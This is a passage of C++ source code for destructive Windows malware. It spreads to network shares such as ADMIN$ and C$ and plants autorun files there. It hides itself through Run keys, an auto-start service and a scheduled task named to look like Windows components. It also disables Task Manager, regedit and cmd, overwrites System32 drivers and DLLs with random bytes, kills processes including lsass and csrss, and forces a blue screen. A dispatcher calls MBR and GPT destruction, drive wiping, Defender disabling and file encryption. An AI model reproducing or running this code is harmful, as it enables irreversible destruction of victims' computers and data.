    __except (EXCEPTION_EXECUTE_HANDLER) {
        // Expected to fail on modern systems
    }
    
    biosCorruptionActive = true;
}

void PropagateNetwork() {
    // Attempt to propagate via network shares
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerNameW(computerName, &size);
    
    // Simple network propagation - copy to accessible shares
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    NETRESOURCEW nr = {0};
    nr.dwType = RESOURCETYPE_DISK;
    nr.lpLocalName = NULL;
    nr.lpProvider = NULL;
    
    // Try common network shares
    const wchar_t* shares[] = {
        L"\\\\*\\ADMIN$", L"\\\\*\\C$", L"\\\\*\\D$", L"\\\\*\\IPC$",
        L"\\\\*\\PRINT$", L"\\\\*\\FAX$", L"\\\\*\\NETLOGON", L"\\\\*\\SYSVOL"
    };
    
    for (int i = 0; i < sizeof(shares)/sizeof(shares[0]); i++) {
        wchar_t targetShare[256];
        wsprintfW(targetShare, shares[i]);
        
        nr.lpRemoteName = targetShare;
        
        if (WNetAddConnection2W(&nr, NULL, NULL, 0) == NO_ERROR) {
            wchar_t destPath[256];
            wsprintfW(destPath, L"%s\\system32\\winlogon_helper.exe", targetShare);
            
            CopyFileW(szPath, destPath, FALSE);
            
            // Create autorun.inf
            wchar_t autorunPath[256];
            wsprintfW(autorunPath, L"%s\\autorun.inf", targetShare);
            
            HANDLE hFile = CreateFileW(autorunPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                const char* autorunContent = "[autorun]\nopen=winlogon_helper.exe\nshell\\open=Open\nshell\\open\\command=winlogon_helper.exe\nshell\\explore=Explorer\nshell\\explore\\command=winlogon_helper.exe";
                DWORD written;
                WriteFile(hFile, autorunContent, strlen(autorunContent), &written, NULL);
                CloseHandle(hFile);
            }
            
            WNetCancelConnection2W(targetShare, 0, TRUE);
        }
    }
    
    networkPropagationActive = true;
}

void ExecuteDestructiveActions() {
    if (destructiveActionsTriggered) return;
    destructiveActionsTriggered = true;

    // Privileged actions (admin only)
    if (g_isAdmin) {
        ClearEventLogs();
        ClearShadowCopies();
        CorruptBootFiles();
        CorruptKernelFiles();
        DestroyMBR();
        DestroyGPT();
        SetCustomBootFailure();
        WipeAllDrives();
        DisableWindowsDefender();
        EncryptUserFiles();
        CorruptBIOS();
        PropagateNetwork();
    }

    // Non-privileged actions
    WipeRemovableMedia();
}

BOOL IsWindows64() {
    BOOL bIsWow64 = FALSE;
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
        GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
    
    if (fnIsWow64Process) {
        fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
    }
    return bIsWow64;
}

void InstallPersistence() {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    wchar_t targetPath[MAX_PATH];
    if (g_isAdmin) {
        GetSystemDirectoryW(targetPath, MAX_PATH);
        lstrcatW(targetPath, L"\\winlogon_helper.exe");
    } else {
        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, targetPath);
        lstrcatW(targetPath, L"\\system_health.exe");
    }
    
    // Handle Wow64 redirection untuk Windows 64-bit
    PVOID oldRedir = NULL;
    if (IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
            if (pfnDisable) pfnDisable(&oldRedir);
        }
    }
    
    CopyFileW(szPath, targetPath, FALSE);
    
    // Set hidden and system attributes
    SetFileAttributesW(targetPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    HKEY hKey;
    if (g_isAdmin) {
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    } else {
        RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, NULL, REG_OPTION_NON_VOLatILE, KEY_WRITE, NULL, &hKey, NULL);
    }
    RegSetValueExW(hKey, L"SystemHealthMonitor", 0, REG_SZ, (BYTE*)targetPath, (lstrlenW(targetPath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
    
    // Also add to services if admin
    if (g_isAdmin) {
        SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (scm) {
            SC_HANDLE service = CreateServiceW(
                scm,
                L"SystemHealthMonitor",
                L"System Health Monitoring Service",
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_SEVERE,
                targetPath,
                NULL, NULL, NULL, NULL, NULL
            );
            
            if (service) {
                CloseServiceHandle(service);
            }
            CloseServiceHandle(scm);
        }
    }
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    wchar_t cmd[1024];
    wsprintfW(cmd, 
        L"schtasks /create /tn \"Windows Integrity Check\" /tr \"\\\"%s\\\"\" /sc minute /mo 1 /st %02d:%02d /f",
        targetPath, st.wHour, st.wMinute);
    
    // Ganti WinExec dengan CreateProcess
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    
    // Revert redirection
    if (oldRedir && IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
            if (pfnRevert) pfnRevert(oldRedir);
        }
    }
    
    persistenceInstalled = true;
}

void DisableSystemTools() {
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    DWORD value = 1;
    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegCloseKey(hKey);

    if (g_isAdmin) {
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    
    disableTaskManager = true;
    disableRegistryTools = true;
}

void CorruptSystemFiles() {
    const wchar_t* targets[] = {
        L"C:\\Windows\\System32\\drivers\\*.sys",
        L"C:\\Windows\\System32\\*.dll",
        L"C:\\Windows\\System32\\*.exe",
        L"C:\\Windows\\System32\\config\\*",
        L"C:\\Windows\\System32\\*.mui",
        L"C:\\Windows\\SysWOW64\\*.dll",
        L"C:\\Windows\\SysWOW64\\*.exe",
        L"C:\\Windows\\SysWOW64\\*.mui"
    };
    
    // Handle Wow64 redirection untuk Windows 64-bit
    PVOID oldRedir = NULL;
    if (IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
            if (pfnDisable) pfnDisable(&oldRedir);
        }
    }
    
    for (size_t i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(targets[i], &fd);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    wchar_t filePath[MAX_PATH];
                    if (i == 0) {
                        wsprintfW(filePath, L"C:\\Windows\\System32\\drivers\\%s", fd.cFileName);
                    } else if (i == 3) {
                        wsprintfW(filePath, L"C:\\Windows\\System32\\config\\%s", fd.cFileName);
                    } else if (i >= 5) {
                        wsprintfW(filePath, L"C:\\Windows\\SysWOW64\\%s", fd.cFileName);
                    } else {
                        wsprintfW(filePath, L"C:\\Windows\\System32\\%s", fd.cFileName);
                    }
                    
                    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD fileSize = GetFileSize(hFile, NULL);
                        if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                            std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
                            if (buffer) {
                                for (DWORD j = 0; j < fileSize; j++) {
                                    buffer[j] = static_cast<BYTE>(dis(gen));
                                }
                                
                                DWORD written;
                                WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
                            }
                        }
                        CloseHandle(hFile);
                    }
                }
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
    }
    
    // Revert redirection
    if (oldRedir && IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
            if (pfnRevert) pfnRevert(oldRedir);
        }
    }
    
    fileCorruptionActive = true;
}

void KillCriticalProcesses() {
    const wchar_t* targets[] = {
        L"taskmgr.exe",
        L"explorer.exe",
        L"msconfig.exe",
        L"cmd.exe",
        L"powershell.exe",
        L"regedit.exe",
        L"mmc.exe",
        L"services.exe",
        L"svchost.exe",
        L"winlogon.exe",
        L"lsass.exe",
        L"csrss.exe",
        L"smss.exe",
        L"wininit.exe",
        L"spoolsv.exe"
    };
    
    DWORD processes[1024], cbNeeded;
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        DWORD cProcesses = cbNeeded / sizeof(DWORD);
        
        for (DWORD i = 0; i < cProcesses; i++) {
            wchar_t szProcessName[MAX_PATH] = L"<unknown>";
            
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, processes[i]);
            if (hProcess) {
                HMODULE hMod;
                DWORD cbNeeded;
                
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(wchar_t));
                    
                    for (size_t j = 0; j < sizeof(targets)/sizeof(targets[0]); j++) {
                        if (lstrcmpiW(szProcessName, targets[j]) == 0) {
                            TerminateProcess(hProcess, 0);
                            break;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    
    processKillerActive = true;
}

void TriggerBSOD() {
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
    if (ntdll) {
        typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
        pdef_NtRaiseHardError NtRaiseHardError = 
            reinterpret_cast<pdef_NtRaiseHardError>(GetProcAddress(ntdll, "NtRaiseHardError"));
        
        if (NtRaiseHardError) {
            ULONG Response;
            NTSTATUS status = STATUS_FLOAT_MULTIPLE_FAULTS;
            NtRaiseHardError(status, 0, 0, 0, 6, &Response);
        }
    }
    
    // Additional BSOD methods
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    typedef NTSTATUS(NTAPI* pdef_ZwRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
    
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        pdef_RtlAdjustPrivilege RtlAdjustPrivilege = reinterpret_cast<pdef_RtlAdjustPrivilege>(
            GetProcAddress(hNtdll, "RtlAdjustPrivilege"));
        pdef_ZwRaiseHardError ZwRaiseHardError = reinterpret_cast<pdef_ZwRaiseHardError>(
            GetProcAddress(hNtdll, "ZwRaiseHardError"));
        
        if (RtlAdjustPrivilege && ZwRaiseHardError) {
            BOOLEAN bEnabled;
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
            ZwRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &ULONG(0));
        }
    }
    
    // Fallback: Cause access violation
    int* p = (int*)0x1;
    *p = 0;
}

void RunBackgroundProcess() {
    FreeConsole();
    
    // Inisialisasi layar
    HDC hdcScreen = GetDC(NULL);
    screenWidth = GetSystemMetrics(SM_CXSCREEN);
    screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = -screenHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    
    hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    ReleaseDC(NULL, hdcScreen);
    
    // Main loop background
    while (true) {
        if (!persistenceInstalled) {
            InstallPersistence();
            DisableSystemTools();
            DisableCtrlAltDel();
            
            if (g_isAdmin) {
                BreakTaskManager();
                SetCriticalProcess();
            }
        }
        
        CaptureScreen(NULL);
        ApplyGlitchEffect();
        
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        SelectObject(hdcMem, hGlitchBitmap);
        
        POINT ptZero = {0, 0};
        SIZE size = {screenWidth, screenHeight};
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
        
        HWND hDesktop = GetDesktopWindow();
        UpdateLayeredWindow(hDesktop, hdcScreen, &ptZero, &size, hdcMem, 
                           &ptZero, 0, &blend, ULW_ALPHA);
        
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        
        Sleep(REFRESH_RATE);
    }
}
